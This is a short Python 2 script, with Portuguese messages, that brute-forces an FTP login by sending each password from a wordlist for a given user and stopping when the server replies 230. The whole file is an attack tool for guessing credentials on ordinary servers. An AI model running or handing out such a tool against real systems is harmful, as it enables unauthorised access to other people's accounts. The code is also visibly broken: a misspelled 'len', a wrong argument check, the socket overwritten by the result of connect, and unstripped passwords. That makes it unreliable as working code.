#!/usr/bin/python

import socket
import re
import sys

if lena(sys.argv) < 2:
	print "Use python bruteforce_ftp.py 127.0.0.1 user"
	sys.exit(0)

usuario = sys.argv[2]

file = open("lista.txt")

for linha in file.readlines():
	print "Testando com %s:%s " %(usuario, linha)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s= s.connect((sys.argv[1], 21))
	s.recv(1024)
	s.send("USER "+usuario+"\r\n")
	s.recv(1024)
	s.send("PASS "+linha+"\r\n")
	resulta = s.recv(1024)
	s.send("QUIT\r\n")

	if re.search("230", resulta):
		print "[+] => SENHA ENCONTRADA >>> %s:%s" %(usuario, linha)
		break
	else:
		print "[-] Acesso Negado [-]\n"
